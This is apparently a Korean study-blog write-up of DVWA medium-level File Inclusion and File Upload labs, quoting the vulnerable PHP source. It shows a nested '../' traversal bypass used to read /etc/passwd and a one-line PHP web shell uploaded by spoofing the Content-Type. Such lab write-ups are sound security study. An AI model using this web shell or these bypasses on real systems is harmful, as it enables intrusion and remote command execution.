---
layout: default
title: Day37
nav_order: 2

parent: Hacking Project - W6
grand_parent: P4C
---

##### 해당 게시글은 빡공팟 4기(with TeamH4C)와 관련되어 있습니다
-----
중간 난이도로 설정한 뒤 시작!

# > DVWA: File Inclusion

## 삽질

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\\" ), "", $file );

?> 
```
low 레벨을 풀 때는 몰랐는데 사실 상위 경로로 이동해서 유의미한 파일을 찾는 문제였다 하하;;

<br>

## Write up

`/etc/passwd` 입력을 하면 바로 출력이 된다.

![image-20220524161023545](../img/image-20220524161023545.png)

<br>

`../`을 공백으로 치환하는 것을 우회하기 위해서 .../../를 이용했다. `.'../'./` 작은 따옴표 부분이 치환되면 `../`가 완성되는 원리이다. 

![image-20220524161306423](../img/image-20220524161306423.png)



<br><br><br>

-----

# > DVWA: File Upload

## 삽질

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

    // Is it an image?
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}
?> 
```

파일의 확장자 검사를 진행한다. jpeg와 png가 아니면 업로드를 제한하려는 듯하다.

<br>

## Write up

 `php` 확장자를 업로드 하면서 타입을 변경해주면 업로드 될 것이다.

먼저 업로드하려는  medium.php 이다.

```php
<?php
$cmd = $_GET['c'];
system($cmd);
?>
```

V3 안끄고 계속 만들다가 계속 삭제되고 있었다. 그것도 모르고 재부팅만 4번하는 해프닝이 ^^;;

위 코드의 확장자는 php이고, 해당 파일을 업로드 하였을 때 패킷을 잡은 모습이다.

![image-20220524224754626](../img/image-20220524224754626.png)

코드에서 감지하는 부분으로 예상되니 이 부분을 "image/jpeg" 로 수정하고 전달하자.

![image-20220524225114928](../img/image-20220524225114928.png)

성공적으로 업로드 되는 것을 확인할 수 있다.
